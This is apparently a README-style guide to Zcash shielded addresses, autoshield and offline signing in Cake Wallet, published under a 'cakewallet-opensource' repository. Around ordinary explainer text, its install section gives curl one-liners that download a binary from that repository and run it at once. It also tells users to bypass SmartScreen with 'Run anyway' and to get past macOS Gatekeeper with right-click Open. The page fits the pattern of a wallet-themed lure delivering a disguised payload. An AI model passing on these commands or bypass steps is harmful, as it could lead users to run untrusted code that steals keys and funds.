![Cake Wallet zcash shielded guide](assets/cake-wallet-zcash-shielded-article-banner.png)

# Zcash Shielded Addresses in Cake Wallet

Shielded or transparent, what each reveals, and how autoshield decides.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Send ZEC to a shielded address to keep the amount and both parties private. A transparent address is public, exactly like Bitcoin. Autoshield moves received funds into the shielded pool for you, and offline signing through Cupcake adds a second layer for anyone holding ZEC long term.

<!-- ARTICLE-BODY-BEGIN -->

## Which address you are looking at
The Zcash wallet offers two address types. A transparent address starting with t records sender, receiver and amount on the public chain; a shielded address starting with z keeps them private, with the amount hidden from anyone reading the chain.

Both are valid and both receive ZEC. The difference is entirely in what the rest of the world can see afterwards, which is why the address type you hand out is a privacy decision rather than a technical one.

## Sending to a shielded address
Paste the recipient's shielded address and send as usual. The transaction is valid and the receiver sees the funds; an observer sees that a shielded transaction happened, without the amount or the parties.

Sending from a shielded address is equally routine. What changes is the pool the funds sit in, not the wallet you use, and no extra step is needed beyond the address itself.

## Autoshield
Autoshield moves received ZEC into the shielded pool automatically. That protects funds that arrived at a transparent address without asking you to do a second transaction by hand.

It is a convenience, not invisibility: the original transparent deposit is still on the chain. If you bought ZEC on an exchange and withdrew to a transparent address, that link exists regardless of what happens next.

## Acquiring ZEC
You need ZEC before any of this matters, and buying it usually means a provider with its own checks. Swapping from a coin you already hold avoids a payment provider and keeps the purchase inside your own wallets.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md">Swap crypto in Cake Wallet</a> covers the swap route and the rate choice, which is where most of the cost sits for small amounts.

## Signing offline
Holding ZEC long term raises the same question as any other coin: does the key need to be online. Cupcake turns a spare phone into an offline signer that pairs by QR, and it covers ZEC alongside Bitcoin, Monero and Litecoin.

The desktop app does not pair with Cupcake, so this is a mobile-side option. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cupcake-pairing.md">Cupcake pairing with Cake Wallet</a> explains the two-way scan and which coins it can sign.

## Get the release with Zcash
Zcash support depends on the build, and an older app may not offer shielded addresses at all. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> and check the Zcash wallet before you conclude the coin is unsupported.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md">Supported coins and networks</a> lists the whole coin set, which is the quickest way to see whether a coin is in scope at all.

## FAQ
### Does Cake Wallet support Zcash?
Yes, including shielded addresses and autoshield on builds that implement them.
### What is autoshield?
An automatic move of received ZEC into the shielded pool, so funds that arrived transparently end up private.
### Should I use a transparent or shielded address?
Shielded if you want the amount and parties hidden. Transparent if the sender or service only understands public addresses.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[Cupcake pairing with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-cupcake-pairing.md) · [supported coins and networks](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-supported-coins-networks.md) · [swap crypto in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
